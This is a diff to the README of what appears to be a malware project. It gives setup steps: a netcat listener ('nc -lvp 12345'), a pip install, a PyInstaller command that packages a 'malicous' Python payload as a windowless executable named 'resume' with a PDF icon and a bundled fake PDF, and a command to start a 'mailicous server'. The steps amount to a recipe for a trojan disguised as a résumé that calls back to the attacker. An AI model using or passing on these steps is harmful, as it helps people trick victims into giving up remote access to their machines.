@@ -28,10 +28,13 @@ Key points:
 1. Set up a listener on your machine (educational lab):
    ```bash
    nc -lvp 12345
-2. Run this script on windows terminal to convert python code to malicous exe file:
+2. Run this command to install python libraries:
+   ```bash
+        python -m pip install -r requirements.txt
+3. Run this script on windows terminal to convert python code to malicous exe file:
    ```bash
    python -m PyInstaller --onefile --noconsole --icon=pdf.ico --add-data "Fake.pdf;." --name resume ./payload.py
-3. Run the mailicous server:
+4. Run the mailicous server:
    ```bash
    cd mailicous_server && npm install && npm run dev
 > ⚠️ **Warning:** Do not forget to edit your code.
